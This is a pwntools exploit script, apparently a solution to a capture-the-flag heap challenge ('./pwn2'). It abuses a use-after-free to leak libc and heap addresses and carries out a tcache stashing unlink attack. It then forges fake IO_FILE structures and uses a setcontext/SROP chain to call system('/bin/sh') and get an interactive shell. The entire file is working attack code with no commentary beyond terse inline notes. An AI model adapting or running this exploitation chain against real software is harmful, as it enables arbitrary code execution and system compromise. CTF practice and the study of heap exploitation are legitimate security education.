#coding=utf-8
from pwn import *
context(log_level='debug',arch='amd64')
binary='./pwn2'
main_arena = 0x1ebb80
s = lambda buf: io.send(buf)
sl = lambda buf: io.sendline(buf)
sa = lambda delim, buf: io.sendafter(delim, buf)
sal = lambda delim, buf: io.sendlineafter(delim, buf)
shell = lambda: io.interactive()
r = lambda n=None: io.recv(n)
ra = lambda t=tube.forever:io.recvall(t)
ru = lambda delim: io.recvuntil(delim)
rl = lambda: io.recvline()
rls = lambda n=2**20: io.recvlines(n)
su = lambda buf,addr:io.success(buf+"==>"+hex(addr))
local = 1
if local == 1:
    io=process(binary)
else:
    io=remote()
e=ELF(binary)
libc=e.libc
#libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")
one_gadget = [0x4f3d5,0x4f432,0x10a41c]
def choice(index):
	ru(">> ")
	sl(str(index))

def add(size):
	choice(1)
	ru("size: ")
	sl(str(size))
	
def free(index):
	choice(2)
	ru("index: ")	
	sl(str(index))
	
def edit(index,content):
	choice(3)
	ru("index: ")
	sl(str(index))
	ru("content: ")
	sl(content)
	
def show(index):
	choice(4)
	ru("index")
	sl(str(index))

for i in range(8):
	add(0x90)#0-7

for i in range(7):
	free(i+1)
free(0)
show(0)
libc_base = u64(ru(b'\x7f')[-6:].ljust(8,b'\x00')) - main_arena - 96
fh = libc.sym['__free_hook']+libc_base
mh = libc.sym['__malloc_hook']+libc_base
setcontext = libc.sym['setcontext']+libc_base+61
system = libc.sym['system']+libc_base
#_IO_str_jumps=libc.sym['_IO_str_jumps']+libc_base
show(2)
ru("content: ")
heap = u64(r(6).ljust(8,b'\x00'))-0x340
su("heap",heap)
list_all = libc.sym['_IO_list_all']+libc_base
su('libc_base',libc_base)
for i in range(6):
	add(0xa0)#8-13
for i in range(9):
	add(0x1a0)#14-22

for i in range(7):
	free(22-i)
free(15)
add(0xf0)#23
add(0x1f0)#24
free(14)
add(0xf0)#25
add(0x1f0)#26
for i in range(6):
	free(8+i)

edit(14,b'a'*0xf8+p64(0xb1)+p64(heap+0xe60)+p64(list_all-0x10))

add(0xa0)#Tcache Stashing Unlink Attack 27
for i in range(9):
	add(0xf0)#28-36
for i in range(7):
	free(i+28)
free(35)
add(0x1f0)#37
payload = p64(0)*2+p64(0)+p64(heap+0x1940)+p64(0) #rdx chunk 22
payload += p64(heap+0x330)+p64(heap+22+0x330)+p64(0)*4 #size 90
payload += p64(heap+0xbb0)+p64(0)+p64(0)+b"\x00"*8 #chain 14
payload += p64(0)*4+b"\x00"*48
payload += p64(0x1ed560+libc_base)#_IO_str_jumps
edit(35,payload)#**Fake IO_FILE_plus1(malloc(0x90))**
edit(1,p64(setcontext)+p64(setcontext))
free(1)
add(0x130)#38
edit(38,b'a'*0x88+p64(0x21)*3+p64(0x21)*2+p64(setcontext)+p64(setcontext)+p64(0x21)*2)

edit(7,p64(mh))
payload = p64(0)*2+p64(0)+p64(heap+0x1940)+p64(0) #rdx 22
payload += p64(heap+0x350)+p64(heap+22+0x350)+p64(0)*4 #size 90
payload += p64(heap+0xf10)+p64(0)+p64(0)+b"\x00"*8 #chain 16
payload += p64(0)*4+b"\x00"*48
payload += p64(0x1ed560+libc_base)#_IO_str_jumps
edit(14,payload)#Fake IO_FILE_plus2(malloc(0x90) && hijack malloc_hook = setcontext)
syscall = next(libc.search(asm("syscall\nret")))+libc_base
binsh_addr = libc_base + next(libc.search(b'/bin/sh\0'))
frame = SigreturnFrame()
frame.rsp = (fh&0xfffffffffffff000)+8#16字节对齐

frame.rdi = binsh_addr
frame.rsi = 0
frame.rdx = 0
frame.rip = system
edit(22,bytes(frame))#22

payload = p64(0)*2+p64(0)+p64(heap+0x1940)+p64(0) #rdx 22
payload += p64(heap+0x370)+p64(heap+22+0x370)+p64(0)*4 #size 90
payload += p64(0)+p64(0)+p64(0)+b"\x00"*8 #chain 17
payload += p64(0)*4+b"\x00"*48
payload += p64(0x1ed560+libc_base)#_IO_str_jumps
edit(16,payload)#srop

#gdb.attach(io,'b malloc')
choice(5)

shell()
